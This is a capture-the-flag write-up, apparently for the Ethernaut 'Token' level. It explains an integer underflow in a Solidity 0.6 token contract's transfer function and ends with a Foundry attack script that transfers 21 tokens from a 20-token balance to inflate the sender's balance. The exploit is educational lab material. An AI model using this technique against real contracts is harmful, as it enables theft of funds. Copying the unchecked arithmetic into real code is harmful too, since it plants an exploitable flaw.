# Token   
The challenge description states:
"You are given 20 tokens to start with, and you will beat the level if you somehow manage to get your hands on any additional tokens."

The first thing I noticed was the Solidity version used in the contract:  
`pragma solidity ^0.6.0;`    
   
Additionally, the only public function in the contract lacks proper validations:
```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```
This function allows us to transfer tokens to any address. It first checks if `balances[msg.sender] - _value` is greater than or equal to 0, then subtracts `_value` from the sender's balance and adds it to the recipient's balance.

The balances are stored in this mapping: 
```solidity
mapping(address => uint256) balances;
```
Here, the vulnerability becomes clear. In Solidity versions below 0.8.0, there is no built-in protection against integer overflows or underflows. This means that if we set `_value` to a number larger than our balance (e.g., 21), the subtraction will underflow, resulting in:  
```solidity
20 - 21 = type(uint256).max
```
This underflow will give us an extremely large balance. However, to ensure we don't end up with the same balance as before, we must set the `_to` address to a different address (not our own).

Since the tokens are mapped to our address, we cannot use another contract to interact with this challenge. Instead, we can use a script to exploit the vulnerability:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    address victim = /* Your instance address */ ;

    function run() public {
        vm.startBroadcast();
        (bool success, ) = victim.call(
            abi.encodeWithSignature("transfer(address,uint256)", address(0), 21)
        );
        vm.stopBroadcast();
    }
}
```
